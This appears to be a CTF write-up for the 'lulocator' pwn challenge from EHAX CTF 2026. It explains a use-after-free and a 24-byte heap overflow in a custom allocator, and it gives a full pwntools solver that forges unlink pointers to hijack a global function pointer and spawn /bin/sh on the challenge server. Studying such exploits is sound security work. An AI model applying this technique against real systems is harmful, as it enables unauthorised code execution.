---
title: "[Pwn] lulocator"
description: Writeup for "lulocator" from EHAX CTF 2026.
date: 2026-03-01 09:00:00 +0900
categories: [CTF, EHAX CTF 2026]
tags: [Pwn]
toc: true
comments: false
---

# lulocator (EHAX CTF 2026)

---

- **Name:** lulocator
- **Category:** Pwn
- **Description:** Who needs that buggy malloc? Made my own completely safe lulocator.
- **Difficulty:** ★☆☆☆☆

---

## TL;DR

- The program keeps a **global pointer** called `runner_global`.
- `delete()` **frees** a chunk but **does not clear** `runner_global` → **Use-After-Free (UAF)**.
- `write()` allows writing **`len + 0x18` bytes** into a buffer → **24-byte heap overflow** into the next chunk.
- The custom allocator uses a **doubly-linked free list** and performs an `unlink()`-style removal.
- We forge `fd`/`bk` pointers so `unlink()` **overwrites `runner_global`** to point into our controlled data.
- Then `run()` reads a function pointer from `runner_global + 0x10` and calls it with a string at `runner_global + 0x28`.
- We place `system` at `+0x10` and `"/bin/sh"` at `+0x28` → **shell**.

---

## Overview

Challenge banner:

- Service: `nc chall.ehax.in 40137`
- Handout: `lulocator`, `libc.so.6`

This is a heap challenge with a custom allocator.  
There is a simple menu:

```
1) new
2) write
3) delete
4) info
5) set_runner
6) run
7) quit
```

We manage up to 16 “slots”. Each slot is an object on the heap.

---

## Solution

### 1) Recon

#### Security properties

`checksec` (typical result):

- **No PIE** → binary global addresses are fixed
- **No RELRO**
- **NX enabled**
- **No canary**

So overwriting a global pointer is realistic.

#### Slot layout (important offsets)

Each slot is stored as a struct-like header + user data:

```
slot (obj pointer)
+0x10 : runner function pointer
+0x18 : out pointer (stdout FILE*)
+0x20 : len (user size)
+0x28 : data buffer start
```

The `info` command prints:

- `addr`  → heap address of the slot object
- `out`   → libc pointer (stdout FILE*), same for all slots
- `len`

Example:

```
[info] addr=0x... out=0x... len=64
```

That `out` leak is enough to compute `libc_base`.

#### Key global address

Because PIE is disabled, the global runner pointer is at a fixed address:

- `runner_global = 0x404940`

(You can confirm with `nm -n lulocator | grep runner` or in a disassembler.)

---

### 2) Root cause

There are two main bugs.

#### Bug A — `delete()` keeps a dangling runner pointer (UAF)

Flow:

1. `set_runner(i)` stores slot `i` into `runner_global`.
2. `delete(i)` frees that slot.
3. But `delete()` does **not** clear `runner_global`.

So `runner_global` can point to **freed memory**.

This is a classic **Use-After-Free**.

#### Bug B — `write()` allows an extra 0x18 bytes (heap overflow)

The length check is wrong. Instead of restricting to `len`, it allows:

- `write_len <= slot_len + 0x18`

So we can overflow **24 bytes** past the end of a slot’s data buffer.

Why is 0x18 special?  
Because it is exactly the size of:

- next chunk header (8 bytes)
- plus two pointers (16 bytes) → `fd` and `bk`

So if two slots are adjacent, we can overwrite the next freed chunk’s free-list pointers.

---

### 3) Exploit

We will use **UAF + overflow** to weaponize the allocator’s **unlink** step.

#### Step 0 — Heap layout

Create two equal-sized slots so they sit next to each other:

- A: `new(0x40)`
- B: `new(0x40)`

In the handout, the addresses differ by `0x70`, which matches:

- header `0x28` + data `0x40` = `0x68`, plus alignment/metadata → total stride `0x70`.

So A is directly followed by B.

#### Step 1 — Leaks

Use `info(A)`:

- Leak `out = _IO_2_1_stdout_` (libc)
- Compute:

```
libc_base = out - _IO_2_1_stdout_
system    = libc_base + system
```

We use the provided `libc.so.6` and resolve offsets by symbols (pwntools).

#### Step 2 — Create a dangling `runner_global`

```
set_runner(B)
delete(B)
```

Now `runner_global == B_addr`, but B is in the allocator free list.

#### Step 3 — Forge pointers using the 0x18 overflow

Let:

- `P = A_addr + 0x28` (start of A’s data)

We write into A:

1) In A’s data (controlled memory), we create a **fake “slot-like” object**:

- At `P + 0x10` → place `system`
- At `P + 0x28` → place `"/bin/sh\x00"`

2) Also, to satisfy safe-unlink checks, we place:

- At `P + 0x08` → `B_addr`

3) Then we overflow 0x18 bytes into the freed B chunk metadata:

- Overwrite B’s `fd` and `bk` as:

```
B->fd = P
B->bk = &runner_global   (0x404940)
```

So the free list removal will target our global pointer.

#### Step 4 — Trigger unlink

Call `new()` once more (small size is fine).  
The allocator will pop B from the free list and run something like:

```
bk->fd = fd
fd->bk = bk
```

Because we set `bk = &runner_global` and `fd = P`, the first assignment becomes:

- `runner_global = P`

Now the global runner pointer points into our controlled A.data.

#### Step 5 — Call `run`

`run` behaves like:

```
func = *(runner_global + 0x10)
arg  =  runner_global + 0x28
func(arg)
```

After our overwrite:

- `*(P + 0x10) = system`
- `(P + 0x28)  = "/bin/sh"`

So `run()` becomes:

- `system("/bin/sh")`

Shell obtained → read `flag.txt`.

---

### 4) Why it works

This exploit works because three things align perfectly:

1. **UAF guarantee**: `runner_global` stays equal to `B_addr` even after `delete(B)`.  
   This lets us satisfy checks that rely on `runner_global` still referencing B.

2. **Small, precise overflow**: `write()` gives exactly **0x18** extra bytes.  
   That is enough to overwrite `size`, `fd`, and `bk` in the next freed chunk.

3. **Allocator `unlink()` writes for us**: doubly-linked list removal performs pointer writes.  
   By setting `bk = &runner_global` and `fd = P`, we turn the allocator into a write gadget.

Finally, the program already provides a natural call site:

- `run()` calls the function pointer in the object and passes a pointer to its data.  
  We just shape our fake object so this call becomes `system("/bin/sh")`.

---

## Solver

This solver connects to the remote service, leaks libc via `info`, forges pointers, triggers unlink, then calls `run()`.

```python
#!/usr/bin/env python3
from pwn import *
import re

BIN  = "./lulocator"
LIBC = "./libc.so.6"

context.binary = BIN
context.log_level = "info"

RUNNER_GLOBAL = 0x404940  # fixed because PIE is disabled

def menu(io, n: int):
    io.sendlineafter(b"> ", str(n).encode())

def cmd_new(io, size: int) -> int:
    menu(io, 1)
    io.sendlineafter(b"size: ", str(size).encode())
    line = io.recvline_contains(b"index=")
    m = re.search(rb"index=(\d+)", line)
    return int(m.group(1))

def cmd_info(io, idx: int):
    menu(io, 4)
    io.sendlineafter(b"idx: ", str(idx).encode())
    line = io.recvline_contains(b"addr=")
    m = re.search(rb"addr=0x([0-9a-fA-F]+) out=0x([0-9a-fA-F]+) len=(\d+)", line)
    if not m:
        raise RuntimeError("info parse failed: " + line.decode(errors="ignore"))
    return int(m.group(1), 16), int(m.group(2), 16), int(m.group(3))

def cmd_set_runner(io, idx: int):
    menu(io, 5)
    io.sendlineafter(b"idx: ", str(idx).encode())
    io.recvline()  # consume confirmation line

def cmd_delete(io, idx: int):
    menu(io, 3)
    io.sendlineafter(b"idx: ", str(idx).encode())
    io.recvline()  # consume confirmation line

def cmd_write(io, idx: int, ln: int, data: bytes):
    menu(io, 2)
    io.sendlineafter(b"idx: ", str(idx).encode())
    io.sendlineafter(b"len: ", str(ln).encode())
    io.sendafter(b"data: ", data)
    io.recvline()  # consume confirmation line

def main():
    io = remote("chall.ehax.in", 40137)

    libc = ELF(LIBC, checksec=False)
    STDOUT_OFF = libc.symbols["_IO_2_1_stdout_"]
    SYSTEM_OFF = libc.symbols["system"]

    # 1) Allocate adjacent slots A and B
    A = cmd_new(io, 0x40)
    B = cmd_new(io, 0x40)

    a_addr, out_leak, _ = cmd_info(io, A)
    b_addr, _, _        = cmd_info(io, B)

    libc_base = out_leak - STDOUT_OFF
    system    = libc_base + SYSTEM_OFF

    log.info(f"A={hex(a_addr)} B={hex(b_addr)} out={hex(out_leak)}")
    log.info(f"libc_base={hex(libc_base)} system={hex(system)}")

    # 2) Make runner_global a dangling pointer to B
    cmd_set_runner(io, B)
    cmd_delete(io, B)

    # 3) Forge fake object in A.data and overflow into freed B's fd/bk
    P = a_addr + 0x28  # start of A.data

    # A.data (0x40):
    # - P+0x08 = B_addr   (safe-unlink helper)
    # - P+0x10 = system   (function pointer read by run)
    # - P+0x28 = "/bin/sh"
    data  = b"A"*8
    data += p64(b_addr)       # P+0x08
    data += p64(system)       # P+0x10
    data += b"B"*(0x28 - len(data))
    data += b"/bin/sh\x00"   # P+0x28
    data += b"C"*(0x40 - len(data))

    # overflow 0x18 into B metadata: [size][fd][bk]
    overflow  = p64(0x70)           # chunk size for this layout
    overflow += p64(P)              # B->fd
    overflow += p64(RUNNER_GLOBAL)  # B->bk = &runner_global

    cmd_write(io, A, 0x58, data + overflow)

    # 4) Trigger unlink: allocator pops B and overwrites runner_global = P
    cmd_new(io, 0x10)

    # 5) run -> system("/bin/sh")
    menu(io, 6)
    io.interactive()

if __name__ == "__main__":
    main()
```

---
<img width="521" height="151" alt="image" src="https://github.com/user-attachments/assets/8fb4468d-2dda-41b0-8933-514554732394" />

---

### Notes for readers

- The exact chunk `size` field (`0x70`) depends on the allocator’s internal layout/alignment.  
  In this challenge, two `new(0x40)` allocations are spaced by `0x70`, so `0x70` is correct.
- We use the provided `libc.so.6` so the `stdout` and `system` offsets match the remote.

